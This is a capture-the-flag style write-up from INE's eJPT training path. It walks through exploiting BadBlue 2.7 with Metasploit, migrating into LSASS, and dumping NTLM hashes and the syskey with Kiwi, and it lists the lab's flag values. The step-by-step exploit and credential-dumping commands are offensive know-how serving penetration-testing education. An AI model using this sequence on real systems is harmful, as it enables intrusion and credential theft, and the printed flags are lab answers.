# Windows Credential Dumping via Kiwi (BadBlue 2.7) - INE eJPT

INE credential dumping lab against a Windows target running BadBlue 2.7. Initial access via Metasploit, process migration to LSASS, and full credential extraction using the Kiwi extension - the Meterpreter implementation of Mimikatz. Three flags correspond to the NTLM hash of Administrator, the NTLM hash of student, and the LSA syskey.

Target: `demo.ine.local` (Windows - BadBlue 2.7 on port 80)

---

## Reconnaissance

```bash
ping -c 4 demo.ine.local
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
```

Port 80 - BadBlue 2.7 HTTP server.

---

## Initial Access

```bash
searchsploit badblue 2.7
```

```bash
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
```

Meterpreter session obtained.

---

## Post-Exploitation - Credential Dumping

### Process Migration

```bash
migrate -N lsass.exe
```

Migration to `lsass.exe` is required. LSASS holds credentials in memory and Kiwi needs to run from a process with equivalent or higher integrity to read them.

### Load Kiwi

```bash
load kiwi
```

### Dump All Credentials

```bash
creds_all
```

Flag 1 - Administrator NTLM hash:

```
e3c61a68f1b89ee6c8ba9507378dc88d
```

### SAM Database Dump

```bash
lsa_dump_sam
```

Flag 2 - Student NTLM hash:

```
bd4ca1fbe028f3c5066467a7f6a73b0b
```

### LSA Secrets (Syskey)

```bash
lsa_dump_secrets
```

Flag 3 - Syskey:

```
377af0de68bdc918d22c57a263d38326
```

---

## Key Takeaways

- LSASS (`lsass.exe`) stores credentials for all authenticated sessions on the system. Migration into this process or a process with equivalent token privileges is a prerequisite for Kiwi to function.
- Kiwi is the Metasploit integration of Mimikatz. `creds_all` retrieves all available credentials in one pass: NTLM hashes, Kerberos tickets, and plaintext passwords where available (WDigest enabled).
- `lsa_dump_sam` reads the Security Account Manager database - the local user hash store. `lsa_dump_secrets` retrieves cached domain credentials, service account passwords, and the syskey.
- NTLM hashes are usable directly for pass-the-hash without cracking. The hash itself authenticates against SMB, WMI, and other Windows protocols.
- Credential dumping is the primary post-exploitation objective in Windows environments. A shell without credentials often cannot move laterally or persist across reboots.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
